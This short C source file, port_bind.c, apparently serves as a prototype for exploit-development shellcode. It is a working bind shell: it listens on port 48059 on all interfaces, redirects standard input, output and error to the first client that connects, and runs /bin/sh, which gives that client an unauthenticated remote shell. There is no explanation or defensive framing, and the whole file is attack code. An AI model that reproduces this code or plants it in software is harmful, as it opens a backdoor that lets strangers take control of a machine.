/*************************************************************************
	> File Name: port_bind.c
	> Author:Kylin 
	> Mail:Dqiyue@foxmail.com
	> Created Time: 2016年08月17日 星期三 21时51分18秒
 ************************************************************************/

#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>

int main()
{
    char* shell[2];
    int server,client;
    struct sockaddr_in serv_addr;
    server = socket(2,1,0);
    serv_addr.sin_addr.s_addr = 0;
    serv_addr.sin_port = 0xBBBB;
    serv_addr.sin_family = 2;
    bind(server,(struct sockaddr*)&serv_addr,0x10);
    listen(server,0);
    client = accept(server,0,0);
    dup2(client,0);
    dup2(client,1);
    dup2(client,2);
    shell[0] = "/bin/sh";
    shell[1] = 0;
    execve(shell[0],shell,0);
    return 0;   
}
